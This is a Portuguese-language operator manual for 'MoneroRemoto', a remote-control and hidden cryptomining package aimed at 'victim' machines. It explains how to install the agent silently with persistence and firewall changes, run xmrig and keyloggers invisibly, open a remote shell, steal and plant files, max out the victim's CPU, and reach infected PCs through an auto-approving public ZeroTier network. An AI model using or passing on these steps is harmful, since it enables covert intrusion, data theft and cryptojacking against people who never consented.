================================================================================
           GUIA COMPLETO - SISTEMA DE CONTROLE REMOTO (MoneroRemoto)
================================================================================

Este pacote contém tudo que você precisa para controlar máquinas remotamente,
executar mineração oculta e gerenciar redes de forma silenciosa.

[1] INSTALAÇÃO (Na Máquina Vítima)
--------------------------------------------------------------------------------
1. Copie estes 4 arquivos para a máquina alvo:
   - IniciarComWindows.bat
   - Install.bat
   - Start_Now.bat
   - SystemOut.zip

2. Execute o 'Install.bat' (Duplo clique).
   - O sistema será instalado em C:\Windows\SystemOut (Oculto).
   - O Firewall será configurado automaticamente.
   - O Agente iniciará em modo de serviço (Persistente).

3. (Opcional) Execute 'Start_Now.bat' se quiser iniciar a mineração imediatamente.
   (Caso contrário, você pode iniciar depois remotamente).

4. (Opcional) Execute 'IniciarComWindows.bat' se quiser que o minerador seja iniciado junto com o pc sempre        que iniciar.


[2] CONTROLE (Na Sua Máquina)
--------------------------------------------------------------------------------
Use o 'SystemClient.exe' para se conectar às máquinas infectadas.

1. Abra o SystemClient.exe.
2. Digite o IP da máquina alvo.
3. Use o Menu Principal para enviar comandos.

COMANDOS PRINCIPAIS:
--------------------
A. START:<comando>
   Inicia um programa em SEGUNDO PLANO (Invisível).
   Use para rodar mineradores, keyloggers ou scripts longos.
   Ex: START:xmrig.exe
   Ex: START:notepad.exe (Rodará invisível, consumindo RAM)

B. EXEC:<comando>
   Executa um comando rápido e te mostra a resposta.
   Ex: EXEC:ipconfig         (Ver IP)
   Ex: EXEC:whoami           (Ver usuário logado)
   Ex: EXEC:tasklist         (Ver processos rodando)

C. SHELL:<comando>  (⭐ O MAIS PODEROSO)
   Cria um túnel direto. É como se você estivesse no PC da pessoa.
   Use 'SHELL:cmd.exe' para ter um terminal completo.
   Dentro do Shell você pode:
   - Criar arquivos: echo 123 > C:\teste.txt
   - Ler arquivos:   type C:\Windows\SystemOut\config.json
   - Rodar scripts:  call script.bat

D. START:VISIBLE:<comando>
   Abre o programa NA TELA DA VÍTIMA.
   Use para assustar ou abrir o navegador na cara dela.
   Ex: START:VISIBLE:chrome.exe www.google.com

E. STOPNAME:<nome>
   Mata TODOS os processos com aquele nome.
   Ex: STOPNAME:xmrig  (Para a mineração imediatamente)
   Ex: STOPNAME:chrome (Fecha todos os navegadores da vítima)


F. TRANSFERÊNCIA DE ARQUIVOS (NOVO) 📂
   Use o console para enviar e baixar arquivos de forma furtiva.
   
   PUT <arquivo_local>
   - Envia um arquivo do seu PC para a pasta UPLOAD da vítima.
   - Ex: PUT keylogger.exe
   - Destino: C:\Windows\SystemOut\UPLOAD\keylogger.exe
   
   GET <arquivo_remoto>
   - Baixa um arquivo da pasta UPLOAD (ou caminho completo).
   - Ex: GET secrets.txt
   
   GET UPLOAD
   - Baixa TODA a pasta de uploads da vítima como um arquivo ZIP.
   - Ex: GET UPLOAD  -> Salva como UPLOAD.zip no seu PC.

[3] SystemOutCache.exe
--------------------------------------------------------------------------------

É o programa que fica escutando no pc da vitima, ele é responsaver por escutar os comandos que serao enviado no SystemClient.exe, e enviar para o PC servidor (pc da vitima)

 - Inicia com windowns por padrao
 - Roda como administrador por padrao



[4] SystemNetConfig.exe
--------------------------------------------------------------------------------
O 'SystemNetConfig.exe' é uma ferramenta interativa para configuração de rede.
Ele foi desenhado para ser "Atômico", ou seja, se você configurar algo errado e perder a conexão,
ele detecta e reverte automaticamente em 30 segundos (Rollback).

[COMO ACESSAR]
Use o comando SHELL:
> SHELL: C:\Windows\SystemOut\SystemNetConfig.exe

Primeiro, você deve selecionar o adaptador de rede (ex: Ethernet). Digite o número correspondente.

[MENU PRINCIPAL - EXPLICAÇÃO]

1. [DHCP (Resetar Configurações)]
   - O "Botão de Pânico". Limpa IP estático e REMOVE qualquer Proxy.
   - Restaura a conexão para o padrão automático.
   - Use isso para "Limpar Rastros" ou consertar uma rede quebrada.

2. [Definir IP Estático (c/ Proxy)]
   - A opção principal. Permite definir IP, Gateway, DNS e PROXY tudo de uma vez.
   - Durante a configuração, ele perguntará:
     > Ativar Proxy? (s/n): s
     > Proxy: 192.168.1.50:8080
   - Se a conexão falhar após aplicar, ele desfaz tudo sozinho.

3. [Restaurar Backup (Rollback)]
   - Volta para a configuração exata que estava antes de você mexer.

4. [Histórico de Redes]
   - Mostra um log de auditoria das mudanças feitas no sistema.

5. [Sair]
   - Salva e fecha.

OBS: As alterações são persistentes (sobrevivem ao reboot).


[5] SystemGerenciador_Threads.exe
--------------------------------------------------------------------------------

Ao executar roda uma analise no pc hospedeiro para verificar a pontencia do mesmo (nucleos e threads) com isso ele cria uma configuracao basica de desempenho, baixa, media e alta.

 - Baixa: roda usando poucos threads (deixa o pc usavel)
 - Medio: roda usando medio threads (deixa o pc usavel, mas com gargalo)
 - Alta: roda usando todos threads (impossivel usar o pc, ele vai usar toda a potencia)

por fim, depois de analisar o pc, ele vai pedir pra vc escolher entre, low, medio, hight, e salvar esses dados no arquivo config.json em C:\windows\SystemOut\XMR\config.json

quando rodar o xmrig.exe, ele rodará com as infomacoes atualizada do config.json.


DICA (CONFIGURAÇÃO DO MINETADOR): config.json 
--------------------
O Minerador precisa definir um nome tanto no user"" quanto no pass"" (use o mesmo nome para os dois).
Exemplo: user"PedrinhoBandido01" pass"PedrinhoBandido01"


[6] ZeroTier One.msi
--------------------------------------------------------------------------------

porque usar o ZeroTier?
Sem o ZeroTier, vc só conseguira enviar comando shell estando na mesma rede que o pc da vitima, com o zerotier, vc cria uma LAN virtual (VPN LOCAL ENTRE OS PC), com isso vc consegue se conectar no pc da vitima atraves do pc publico que o ZeroTier te entregar no site: https://my.zerotier.com/network

Obs: Ele é instalado no mesmo momento em que voce clica em "Install.bat".

Antes de rodar o Install.bat voce deve apenas acessar o site: "https://my.zerotier.com/network", crie uma rede e edite o arquivo Install.bat para atualizar sua conexao: (ex: a09acf02334a8115)

Dica: Legacy Site)
Você deve gerenciar a rede pelo Site Legado (https://my.zerotier.com/network).
 - Motivo: Ele permite marcar a rede como PUBLIC (Access Control).
 - Vantagem: Isso autoriza automaticamente qualquer máquina que entrar. Você não precisa ir no site aprovar PC por PC.



[x] DICAS DE OPERAÇÃO
--------------------------------------------------------------------------------
- Persistência: O serviço SystemOutCache.exe inicia sozinho com o Windows.
- Zumbis: Se usar STOP num script .bat, o programa filho pode continuar rodando.
  Sempre use STOPNAME para garantir que matou tudo.
- Logs: Se algo der errado, procure por 'nettool_debug.log' na pasta SystemOut.
- No Windows para melhor desepempenho, altere o Huge Pages e adicionar "Todos".

- Atualização Automática:
  No Menu Principal do Cliente, use a opção '5 - ATUALIZAR AGENTE' para atualizar
  o executável remoto sem perder a conexão persistentemente.
  Basta ter o novo 'SystemOutCache.exe' na mesma pasta do seu SystemClient.
